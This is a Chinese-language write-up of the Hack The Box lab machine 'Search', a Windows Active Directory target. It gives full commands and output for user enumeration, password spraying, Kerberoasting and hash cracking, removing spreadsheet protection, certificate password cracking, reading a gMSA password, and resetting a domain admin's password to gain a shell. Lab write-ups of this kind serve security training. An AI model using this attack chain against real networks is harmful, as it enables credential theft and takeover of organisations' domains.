# htb靶机攻略---search

## 1.信息收集

    
    
    nmap -sT -sV -T4 -O 10.10.11.129
    
    
    
    Nmap 7.93 scan initiated Fri May 19 20:11:55 2023 as: nmap -sT -sV -T4 -O -o nmapscan/info 10.10.11.129
    Nmap scan report for 10.10.11.129
    Host is up (0.39s latency).
    Not shown: 988 filtered tcp ports (no-response)
    PORT     STATE SERVICE       VERSION
    53/tcp   open  domain        Simple DNS Plus
    80/tcp   open  http          Microsoft IIS httpd 10.0
    88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-05-19 12:12:48Z)
    135/tcp  open  msrpc         Microsoft Windows RPC
    139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
    443/tcp  open  ssl/http      Microsoft IIS httpd 10.0
    445/tcp  open  microsoft-ds?
    464/tcp  open  kpasswd5?
    593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
    636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
    3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
    3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
    Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
    OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
    No OS matches for host
    Service Info: Host: RESEARCH; OS: Windows; CPE: cpe:/o:microsoft:windows
    
    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done at Fri May 19 20:14:31 2023 -- 1 IP address (1 host up) scanned in 156.92 seconds
    

其中的80，88，135，445，3268是重点要渗透的端口

## 2.端口渗透

### web-80端口渗透

访问后在界面中找到一些用户信息但是没有发现密码信息后来在题解中才发现在一张图片中存在一个账号和密码信息。将其都分别保存到账号密码文件中

使用kerbrute枚举在域中有效的用户

    
    
    ./kerbrute_linux_amd64 userenum  user --dc 10.10.11.129 -d search.htb
    
    
    
    2023/05/20 20:54:35 >  [+] VALID USERNAME:       hope.sharp@search.htb
    2023/05/20 20:54:35 >  [+] VALID USERNAME:       sierra.frye@search.htb
    2023/05/20 20:54:35 >  [+] VALID USERNAME:       dax.santiago@search.htb
    2023/05/20 20:54:35 >  [+] VALID USERNAME:       keely.lyons@search.htb
    

### smb-445端口渗透

使用crackmapexec smb确认可连接的用户和密码凭据

    
    
    crackmapexec smb 10.10.11.129 -u users -p 'IsolationIsKey?' --continue-on-success
    
    
    
    SMB         10.10.11.129    445    RESEARCH         [*] Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False)
    SMB         10.10.11.129    445    RESEARCH         [+] search.htb\hope.sharp:IsolationIsKey? 
    SMB         10.10.11.129    445    RESEARCH         [-] search.htb\keely.lyons:IsolationIsKey? STATUS_LOGON_FAILURE 
    SMB         10.10.11.129    445    RESEARCH         [-] search.htb\dax.santiago:IsolationIsKey? STATUS_LOGON_FAILURE 
    SMB         10.10.11.129    445    RESEARCH         [-] search.htb\sierra.frye:IsolationIsKey? STATUS_LOGON_FAILURE 
    SMB         10.10.11.129    445    RESEARCH         [-] search.htb\kyla.stewart:IsolationIsKey? STATUS_LOGON_FAILURE 
    SMB         10.10.11.129    445    RESEARCH         [-] search.htb\kaiara.spencer:IsolationIsKey? STATUS_LOGON_FAILURE 
    SMB         10.10.11.129    445    RESEARCH         [-] search.htb\dave.simpson:IsolationIsKey? STATUS_LOGON_FAILURE 
    SMB         10.10.11.129    445    RESEARCH         [-] search.htb\ben.thompson:IsolationIsKey? STATUS_LOGON_FAILURE 
    SMB         10.10.11.129    445    RESEARCH         [-] search.htb\chris.stewart:IsolationIsKey? STATUS_LOGON_FAILURE
    

找到用户hope.sharp可以连接

    
    
    smbmap -H 10.10.11.129 -u hope.sharp -p xxxx
    #找到可以访问的目录
    smbclient -U hope.sharp //10.10.11.129/上面获取到的目录中可访问的目录
    输入密码后访问得到一些用户目录访问刚才使用kerbrute爆破得到的在域中有效的用户目录，在访问用户sierra.frye时目录中存在user.txt文件，这个用户是后面重点要找的对象。
    

### kerberos-88端口渗透

使用脚本GetNPUsers.py

    
    
    ./GetNPUsers.py -u users -no-pass -dc-ip 10.10.11.129 search/ #没有得到任何用户的hash值
    

### LDAP-3268端口渗透

使用脚本GetUserSPNs.py

    
    
    ./GetUserSPNs.py search.htb/hope.sharp: 'IsolationIsKey?' -request #成功从LDAP中的出一个web_svc的hash值
    

### 结合信息继续渗透

在使用GetUserSPNs.py的到的hash值进行破解

    
    
    vim web_svc_hash #将hash值添加到其中
    john web_svc_hash -w=/usr/share/wordlist/rockyou.txt #成功的到一个明文密码
    

对得到的明文密码进行在与得到的用户进行匹配

    
    
    crackmapexec smb -u users -p 'john破解出的明文密码' 10.10.11.129 --continue-on-success 
    #得到了用户edgar.jacobs 使用了相同的密码
    

继续对edgar.jacobs 用户枚举信息

    
    
    smbmap -H 10.10.11.129 -u edgar.jacobs -p '上面得到的密码'
    #得到用户也具有和hope.sharp有相同的访问目录
    smbclient -U edgar.jacobs //10.10.11.129/smbmap得到的目录
    #访问后得到的信息也是读个用户目录，进入后找到当前使用的用户目录遍历目录后找到一个xlsx文件将文件get到本地
    

打开表格文件后选择password表，表中ABCD三个列，C列被隐藏了。在取消隐藏时需要使用密码。

#### 破解表格密码

xlsx表格文件是将许多的xml文件进行压缩而形成的，所以解压xlsx文件

    
    
    mv phishing_attempt.xlsx phishing_attempt.zip #将xlsx文件修改为zip文件
    mkdir table #新建一个目录
    cd table
    cp ../phishing_attempt.zip .
    unzip phishing_attempt.zip #解压文件
    #解压后找到xl目录中的worksheets目录中存放的sheet2.xml，该文件就是表格文件中存在隐藏列的表格
    chmod 777 sheet2.xml #为防止不循序修改将权限直接加到777
    vim或者直接使用图形化界面使用文本编辑器打开整个删除其中的<sheetProtection ....... />标签
    再将文件重新压缩回xlsx文件
    zip -r phishing.xlsx . #就在table文件中进行压缩
    #成功得到没有隐藏的表格文件
    

在表格文件中的到了用户sierra.frye的密码明文，注意这里不是任何hash值

    
    
    smbmap -H 10.10.11.129 -u sierra.frye -p 表格中得到的明文密码 
    smbclient -U sierra.frye //10.10.11.129/存在用户目录的共享目录
    

访问后成功得到了user.txt文件但是还没有得到shell

继续访问用户sierra.frye用户的smb共享目录，在其中找到了两个证书文件.ps和.pfx文件，将证书导入到浏览器中时需要密码。

#### 破解证书密码

    
    
    pfx2john search-RESEARCH-CA.p12 > search-RESEARCH-CA.p12_hash
    john search-RESEARCH-CA.p12_hash -w=/usr/share/wordlist/rockyou.txt
    #成功破解出证书密码，另一个证书密码破解过程同上得到的明文密码是相同的。
    

导入证书后访问使用的协议也就变成了https

访问https://10.10.11.129
访问后会重定向到staff目录下然后会出现一个登录界面，使用用户sierra.frye登录，计算机名在nmap信息收集时得到是research都输入后成功的到sierra.frye的powershell权限。

## 3.权限提升

### bloodhound收集主机信息

    
    
    bloodhound-python -u hope.sharp -p IsolationIsKey? -d search.htb -c All -ns 10.10.11.129 #收集完后会在目录中生成一些json文件将些文件打包成zip文件
    neo4j console
    启动寻血猎犬导入打包好的zip文件
    

![image](https://image.3001.net/images/20230616/1686882360_648bc83824811f6d894dc.png!small)

通过寻找用户sierra.frye到domain admin组的最短路径找到该条路径

操作方法：在得到的当前用户右键选择mark user as owned作为初始点，到domain admin用户组处选择从owned到这里的最短路径。

图示中显示sierra.frye用户属于BIRMINGHAM组，改组又属于ITSEC组，同时用户BIR-ADFS-GMSA用户也属于ITSEC组，同时ITSEC组成员有权读取BIR-ADFS-GMSA的GMSA(Group Managed Service
Accounts 组托管服务账户)的密码，该密码是由 Windows 服务器通过为其生成长随机密码来管理帐户密码的地方，也就是用户BIR-ADFS-GMSA用户的密码拿到该密码就可对域管理员账户组中的tristan用户有完全控制权限。

### 解码随机生成的密码

    
    
    PS C:\Users\Sierra.Frye\documents> $gmsa = Get-ADServiceAccount -Identity 'BIR-ADFS-GMSA' -Properties 'msDS-ManagedPassword'
    PS C:\Users\Sierra.Frye\documents> $mp = $gmsa.'msDS-ManagedPassword'
    PS C:\Users\Sierra.Frye\documents> ConvertFrom-ADManagedPasswordBlob $mp
    Version                   : 1
    CurrentPassword           : ꪌ絸禔හॐ๠뒟娯㔃ᴨ蝓㣹瑹䢓疒웠ᇷꀠ믱츎孻勒壉馮ၸ뛋귊餮꤯ꏗ춰䃳ꘑ畓릝樗껇쁵藫䲈酜⏬궩Œ痧蘸朘                             嶑侪糼亵韬⓼ↂᡳ춲⼦싸ᖥ裹沑᳡扚羺歖㗻෪ꂓ㚬⮗㞗ꆱ긿쾏㢿쭗캵십ㇾେ͍롤ᒛ�䬁ማ譿녓鏶᪺骲雰騆惿閴滭䶙                             竜迉竾ﵸ䲗蔍瞬䦕垞뉧⩱茾蒚⟒澽걍盡篇
    SecureCurrentPassword     : System.Security.SecureString
    PreviousPassword          : 
    SecurePreviousPassword    : 
    QueryPasswordInterval     : 2511.15:38:34.3218316
    UnchangedPasswordInterval : 2511.15:33:34.3218316
    

使用用户sierra.frye得到随机生成的密码是乱码因为它只是 256 个字节的伪随机数据，被解释为 128 个 UTF-16
字符。但是可以使用,将其存入变量中。

    
    
    PS C:\Users\Sierra.Frye\documents> (ConvertFrom-ADManagedPasswordBlob $mp).CurrentPassword
    'ꪌ絸禔හॐ๠뒟娯㔃ᴨ蝓㣹瑹䢓疒웠ᇷꀠ믱츎孻勒壉馮ၸ뛋귊餮꤯ꏗ춰䃳ꘑ畓릝樗껇쁵藫䲈酜⏬궩Œ痧蘸朘嶑侪糼亵韬⓼ↂᡳ춲⼦싸ᖥ裹沑᳡扚羺歖㗻෪ꂓ㚬⮗㞗ꆱ긿쾏㢿쭗캵십ㇾେ͍롤ᒛ�䬁ማ譿녓鏶᪺骲雰騆惿閴滭䶙竜迉竾ﵸ䲗蔍瞬䦕垞뉧⩱茾蒚⟒澽座걍盡篇'    
    #将密码保存到变量(ConvertFrom-ADManagedPasswordBlob $mp).CurrentPassword中
    PS C:\Users\Sierra.Frye\documents> $password = (ConvertFrom-ADManagedPasswordBlob $mp).CurrentPassword #将变量(ConvertFrom-ADManagedPasswordBlob $mp).CurrentPassword赋值给$password
    PS C:\Users\Sierra.Frye\documents> $SecPass = (ConvertFrom-ADManagedPasswordBlob $mp).SecureCurrentPassword #将加密后的密码赋值给$SecPass
    PS C:\Users\Sierra.Frye\documents> $cred = New-Object System.Management.Automation.PSCredential BIR-ADFS-GMSA, $SecPass #将用户BIR-ADFS-GMSA的账号名和密码保存到变量$cred中
    PS C:\Users\Sierra.Frye\documents> Invoke-Command -ComputerName 127.0.0.1 -ScriptBlock {whoami} -Credential $cred #以BIR-ADFS-GMSA身份运行PSCredential(我理解就是以BIR-ADFS-GMSA使用Invoke-Command去执行系统命令)
    PS C:\Users\Sierra.Frye\documents> Invoke-Command -ComputerName 127.0.0.1 -ScriptBlock {Set-ADAccountPassword -Identity tristan.davies -reset -NewPassword
     (ConvertTo-SecureString -AsPlainText '0xdf0xdf!!!' -force)} -Credential $cred #因为用户BIR-ADFS-GMSA对用户tristan.davies有完全控制权限所以直接修改该用户的密码。
    

最后在kali中使用wmiexec.py脚本得到用户tristan.davies的shell也就得到了administrator用户的shell。

    
    
    wmiexec.py 'search/tristan.davies:0xdf0xdf!!!@10.10.11.129'
    

